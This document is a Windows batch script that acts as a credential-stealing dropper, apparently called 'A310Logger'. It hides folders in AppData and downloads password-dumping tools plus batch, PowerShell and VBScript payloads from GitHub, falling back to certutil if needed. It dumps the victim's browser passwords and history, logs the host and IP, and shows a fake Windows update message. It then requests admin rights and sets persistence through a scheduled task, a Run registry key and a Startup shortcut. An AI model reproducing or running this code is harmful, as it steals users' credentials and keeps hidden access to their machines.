@ECHO OFF
setlocal enableextensions
cd /D "%~dp0"



echo *************Create directory****************
   mkdir C:\Users\%username%\AppData\Roaming > nul 2> nul
   attrib +h C:\Users\%username%\AppData\Roaming /s /d > nul 2> nul

   mkdir C:\Users\%username%\AppData\Local\0101 > nul 2> nul
   attrib +h C:\Users\%username%\AppData\Local\0101 /s /d > nul 2> nul

   mkdir C:\Users\%username%\AppData\Local\A310Logger > nul 2> nul
   attrib +h C:\Users\%username%\AppData\Local\A310Logger /s /d > nul 2> nul

   mkdir C:\Users\%username%\AppData\Local\A310Logger\Browsers  > nul 2> nul
   attrib +h C:\Users\%username%\AppData\Local\A310Logger\Browsers  /s /d > nul 2> nul

   mkdir C:\Users\%username%\AppData\Local\A310Logger\Others > nul 2> nul
   attrib +h C:\Users\%username%\AppData\Local\A310Logger\Others /s /d > nul 2> nul
   echo Directory Created


echo *************Copy file****************
   xcopy "C:\Users\%username%\AppData\Roaming\*.*" "C:\Users\%username%\AppData\Roaming\" /K /D /H /Y
   echo Copied!
   echo.
   echo.
   echo.
   echo.

echo *************Changing working dir****************
   cd /D C:\Users\%username%\AppData\Roaming\
   echo Success!
   echo.


:loop
echo *************Internet connection****************     
   echo Checking internet connectivity. Please wait...
   timeout 1 > NUL
   Ping www.google.nl -n 1 -w 1000 > NUL
   if errorlevel 1 (set internet=Not connected to internet) else (set internet=Connected to internet)
   echo %internet%!!
   echo.
   timeout 1 > NUL
   if "%internet%" == "Not connected to internet" ( 
      cls
      goto loop
   ) else (


echo *************DOWNLOAD file****************
   echo Downloading...
   timeout 3 > NUL
   
   if not exist "C:\Users\%username%\AppData\Roaming\BrowserDownloadsview.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/browserdownloadsview.exe?raw=true', 'BrowserDownloadsview.exe')" > nul 2> nul    
   )
   if not exist "C:\Users\%username%\AppData\Roaming\BrowsingHistoryView.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/browsinghistoryview.exe?raw=true', 'BrowsingHistoryView.exe')" > nul 2> nul 
   )
   if not exist "C:\Users\%username%\AppData\Roaming\ChromePass.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/ChromePass.exe?raw=true', 'ChromePass.exe')" > nul 2> nul
   )
   if not exist "C:\Users\%username%\AppData\Roaming\IEpassView.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/iepv.exe?raw=true', 'IEpassView.exe')" > nul 2> nul
   )
   if not exist "C:\Users\%username%\AppData\Roaming\MyLastSearch.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/mylastsearch.exe?raw=true', 'MyLastSearch.exe')" > nul 2> nul
   )
   if not exist "C:\Users\%username%\AppData\Roaming\OperaPassView.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/operapassview.exe?raw=true', 'OperaPassView.exe')" > nul 2> nul
   )
   if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/PasswordFox.exe?raw=true', 'PasswordFox.exe')" > nul 2> nul
   )
   if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (      
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/facebook.bat?raw=true', 'facebook.bat')" > nul 2> nul
   )
   if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/AutoRun.vbs?raw=true', 'AutoRun.vbs')" > nul 2> nul
   )
   if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/instagram.ps1?raw=true', 'instagram.ps1')" > nul 2> nul
   )
   if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Google/blob/main/a310logger.exe?raw=true', 'a310logger.exe')" > nul 2> nul
   )
   if errorlevel 1 goto ERROR2   
   goto SUCCESS 


   :ERROR2
   echo Your first attempt might fail! We'll try second.
   echo.
   echo Please, wait...
   timeout 3 > NUL
   if not exist "C:\Users\%username%\AppData\Roaming\BrowserDownloadsview.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/browserdownloadsview.exe?raw=true -OutFile BrowserDownloadsview.exe" > nul 2> nul
   )
   if not exist "C:\Users\%username%\AppData\Roaming\BrowsingHistoryView.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/browsinghistoryview.exe?raw=true -OutFile BrowsingHistoryView.exe" > nul 2> nul
   )
   if not exist "C:\Users\%username%\AppData\Roaming\ChromePass.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/ChromePass.exe?raw=true -OutFile ChromePass.exe" > nul 2> nul
   )
   if not exist "C:\Users\%username%\AppData\Roaming\IEpassView.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/iepv.exe?raw=true -OutFile IEpassView.exe" > nul 2> nul
   )
   if not exist "C:\Users\%username%\AppData\Roaming\MyLastSearch.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/mylastsearch.exe?raw=true -OutFile MyLastSearch.exe" > nul 2> nul
   )
   if not exist "C:\Users\%username%\AppData\Roaming\OperaPassView.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/operapassview.exe?raw=true -OutFile OperaPassView.exe" > nul 2> nul
   )
   if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/PasswordFox.exe?raw=true -OutFile PasswordFox.exe" > nul 2> nul
   )
   if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/facebook.bat?raw=true -OutFile facebook.bat" > nul 2> nul
   )
   if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/AutoRun.vbs?raw=true -OutFile AutoRun.vbs" > nul 2> nul
   )
   if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/instagram.ps1?raw=true -OutFile instagram.ps1" > nul 2> nul
   )
   if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Google/blob/main/a310logger.exe?raw=true -OutFile a310logger.exe" > nul 2> nul
   )   
   if errorlevel 1 goto ERROR3
   goto SUCCESS 


   :ERROR3
   echo Your second attempt might fail! We'll try third.
   echo.
   echo Please, wait...
   timeout 3 > NUL
   set url="https://github.com/win32u/Google/blob/main/a310logger.exe?raw=true"
   set filename="a310logger.exe"
   certutil -urlcache -split -f %url% %filename% > nul 2> nul
   if errorlevel 1 goto EOF
   goto SUCCESS 
  

   :EOF 
   echo Your last attempt might fail.
   echo Check internet conectivity!?
   timeout 5 
   cls
   goto loop
   pause


   :SUCCESS
   echo DOWNLOAD SUCCESSFUL!!
   echo *************Execute file****************
      for %%a in (*.exe) do (
         call %%a /stext C:\Users\%username%\AppData\Local\A310Logger\Others\%%a.txt
      )		
      echo User: %ComputerName% \ %UserName% >"C:\Users\%username%\AppData\Local\A310Logger\IPnHost.txt"
      echo Public_IP: >>"C:\Users\%username%\AppData\Local\A310Logger\IPnHost.txt"
      ipconfig | find /i "IPv4" >>"C:\Users\%username%\AppData\Local\A310Logger\IPnHost.txt"
      echo Executed
      echo.


   echo *************Windows updates found****************
      echo Checking Windows for Update. Please wait...
      echo.

   echo *************Run powershell file****************
      powershell.exe -ExecutionPolicy Bypass -File "%cd%\instagram.ps1"
	   

   echo *************Give feedback success****************
      echo Yes!!    



   )
   




pause

	echo *************Administrator rights****************     
	:: BatchGotAdmin        
	:-------------------------------------        
	REM  --> Check for permissions  
	>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"  
	REM --> If error flag set, we do not have admin.  
	if '%errorlevel%' NEQ '0' (    echo Requesting administrative privileges...    goto UACPrompt) else ( goto gotAdmin )  
	:UACPrompt  
		echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"  
		echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"  
		"%temp%\getadmin.vbs"  
		exit /B
	:gotAdmin  


		cd /d "%~dp0"
		echo You are now admin


		schtasks /Create /SC Onevent /EC Microsoft-Windows-NetworkProfile/Operational /MO "*[System[Provider[@Name='Microsoft-Windows-NetworkProfile'] and EventID=10000]]" /TN "YouTube" /TR "C:\Users\%username%\AppData\Roaming\AutoRun.vbs" /F
		REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v iloveyou /t REG_SZ /d C:\Users\%username%\AppData\Roaming\AutoRun.vbs /f
		mklink "%systemdrive%\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\AutoRun.vbs - Shortcut" "C:\Users\%username%\AppData\Roaming\AutoRun.vbs"



PAUSE

